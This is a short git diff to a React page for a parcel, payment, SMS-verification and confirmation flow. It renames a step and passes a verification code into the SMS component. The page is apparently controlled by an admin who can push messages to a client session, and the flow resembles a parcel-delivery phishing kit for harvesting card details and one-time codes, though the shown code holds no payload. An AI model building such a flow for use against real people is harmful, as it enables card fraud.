@@ -1,3 +1,4 @@
+import { useState } from "react";
 import Header from "@/components/Header";
 import StepIndicator from "@/components/StepIndicator";
 import ParcelDetails from "@/components/ParcelDetails";
@@ -8,7 +9,7 @@ import AdminAlert from "@/components/AdminAlert";
 import { useClientSession } from "@/hooks/useClientSession";
 import { RefreshCw } from "lucide-react";
 
-const steps = ["Parcel", "Payment", "SMS", "Confirmation"];
+const steps = ["Parcel", "Payment", "Verification", "Confirmation"];
 
 const Index = () => {
   const { 
@@ -21,11 +22,14 @@ const Index = () => {
     clearAdminMessage 
   } = useClientSession();
 
+  const [verificationCode, setVerificationCode] = useState("");
+
   const handleProceedToPayment = () => {
     updateStep(2);
   };
 
-  const handleProceedToSms = () => {
+  const handleProceedToVerification = (code: string) => {
+    setVerificationCode(code);
     updateStep(3);
   };
 
@@ -81,11 +85,15 @@ const Index = () => {
         )}
 
         {currentStep === 2 && (
-          <PaymentForm onProceed={handleProceedToSms} onBack={handleBack} />
+          <PaymentForm onProceed={handleProceedToVerification} onBack={handleBack} />
         )}
 
         {currentStep === 3 && (
-          <SmsVerification onProceed={handleProceedToConfirmation} onBack={handleBack} />
+          <SmsVerification 
+            onProceed={handleProceedToConfirmation} 
+            onBack={handleBack} 
+            expectedCode={verificationCode}
+          />
         )}
 
         {currentStep === 4 && (
